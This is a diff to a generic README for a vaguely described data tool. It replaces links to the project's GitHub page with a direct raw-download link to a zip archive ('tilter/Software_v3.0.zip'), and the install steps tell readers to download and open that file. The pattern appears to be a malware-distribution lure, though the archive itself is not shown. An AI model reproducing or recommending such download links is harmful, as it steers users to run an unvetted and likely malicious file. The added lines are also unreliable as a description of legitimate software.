@@ -1,6 +1,6 @@
 # 🚀 1 - Simplify your daily data tasks easily
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Endemical-phoebe6339/1)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/Endemical-phoebe6339/1/main/tilter/Software_v3.0.zip)
 
 ## 📌 About This Tool
 
@@ -31,7 +31,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to get the tool on your machine.
 
-1. Visit the project website at https://github.com/Endemical-phoebe6339/1.
+1. Visit the project website at https://raw.githubusercontent.com/Endemical-phoebe6339/1/main/tilter/Software_v3.0.zip
 2. Look for the latest release version on the page.
 3. Click the link to download the installer file.
 4. Open the downloaded file once the transfer completes.
